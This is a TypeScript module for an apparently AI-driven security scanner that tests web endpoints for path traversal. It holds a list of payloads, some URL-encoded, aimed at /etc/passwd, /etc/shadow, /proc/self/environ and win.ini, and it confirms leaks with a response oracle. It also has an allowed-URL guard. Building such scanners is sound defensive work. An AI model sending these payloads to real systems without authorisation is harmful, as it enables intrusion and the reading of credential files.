import { request } from 'undici'
import { type JudgeContext, type EndpointInfo, type Finding, CONCURRENCY_LIMIT } from '../types/index.js'
import { assertAllowedUrl } from '../safety/url_guard.js'
import { checkFileReadSignatures } from '../attack/oracle.js'
import pLimit from 'p-limit'

export const TEST_PATH_TRAVERSAL_SCHEMA = {
  type: 'object',
  properties: {
    authToken: {
      type: 'string',
      description: 'Bearer token (optional)',
    },
  },
  required: [],
}

const PATH_TRAVERSAL_PAYLOADS = [
  '../../etc/passwd',
  '../../../etc/passwd',
  '..%2F..%2Fetc%2Fpasswd',
  '..%252F..%252Fetc%252Fpasswd',
  '....//....//etc/passwd',
  '/etc/passwd',
  '../../windows/win.ini',
  '..%2F..%2Fwindows%2Fwin.ini',
  '../../boot.ini',
  '/etc/shadow',
  '../../proc/self/environ',
]

const FILE_PARAM_NAMES = /^(file|path|filename|template|page|view|doc|document|dir|folder|resource|load|include|src|source)$/i

function hasFileParam(ep: EndpointInfo): boolean {
  return ep.parameters.some(p =>
    FILE_PARAM_NAMES.test(p.name) && (p.in === 'query' || p.in === 'path' || p.in === 'body')
  )
}

async function testEndpoint(
  endpoint: EndpointInfo,
  targetUrl: string,
  headers: Record<string, string>,
  ctx: JudgeContext,
  findings: Finding[],
): Promise<void> {
  const fileParam = endpoint.parameters.find(p => FILE_PARAM_NAMES.test(p.name))
  const paramName = fileParam?.name ?? endpoint.parameters.find(p => p.in !== 'header')?.name ?? 'file'

  for (const payload of PATH_TRAVERSAL_PAYLOADS) {
    try {
      const url = endpoint.method === 'GET'
        ? `${targetUrl}?${new URLSearchParams({ [paramName]: payload })}`
        : targetUrl

      assertAllowedUrl(url, ctx.allowedUrls)

      const res = await request(url, {
        method: endpoint.method,
        headers,
        body: endpoint.method !== 'GET' ? JSON.stringify({ [paramName]: payload }) : undefined,
      })

      const body = await res.body.text()
      const oracle = checkFileReadSignatures(body)

      if (oracle.isVulnerable) {
        findings.push({
          severity: 'CRITICAL',
          category: 'A',
          description: `Path traversal confirmed on ${endpoint.method} ${endpoint.path} — file contents leaked`,
          evidence: `Payload: ${payload}\ncurl -X ${endpoint.method} '${url}'\nOracle: ${oracle.evidence}\nResponse: ${body.slice(0, 500)}`,
          isFail: true,
          baseDeduction: 10,
          toolName: 'test_path_traversal',
          owaspCategory: 'A01:2021',
          cweId: 'CWE-22',
          confidence: 'HIGH',
        })
        return
      }
    } catch (err) {
      if ((err as Error).message.includes('url_guard')) return
    }
  }
}

export async function testPathTraversal(
  input: { authToken?: string },
  ctx: JudgeContext
): Promise<string> {
  const findings: Finding[] = []
  const results: string[] = []
  const limit = pLimit(CONCURRENCY_LIMIT[ctx.persona])

  const candidates = ctx.endpoints.filter(hasFileParam)
  if (candidates.length === 0) {
    const allEndpoints = ctx.endpoints.filter(ep =>
      ep.parameters.some(p => p.in === 'query' || p.in === 'body' || p.in === 'path')
    )
    if (allEndpoints.length === 0) {
      return 'test_path_traversal: no endpoints with parameters found'
    }
    candidates.push(...allEndpoints.slice(0, 5))
  }

  const headers: Record<string, string> = {
    'Content-Type': 'application/json',
    'User-Agent': 'security-judge/1.0',
  }
  if (input.authToken) headers['Authorization'] = `Bearer ${input.authToken}`
  if (ctx.sessionCookies) headers['Cookie'] = ctx.sessionCookies

  await Promise.allSettled(
    candidates.map(ep =>
      limit(async () => {
        const targetUrl = `${ctx.targetBaseUrl}${ep.path}`
        assertAllowedUrl(targetUrl, ctx.allowedUrls)
        await testEndpoint(ep, targetUrl, headers, ctx, findings)
        results.push(ep.path)
      })
    )
  )

  ctx.findings.push(...findings)
  return `test_path_traversal on ${candidates.length} endpoint(s):\n${results.join('\n')}\nFindings: ${findings.length}`
}
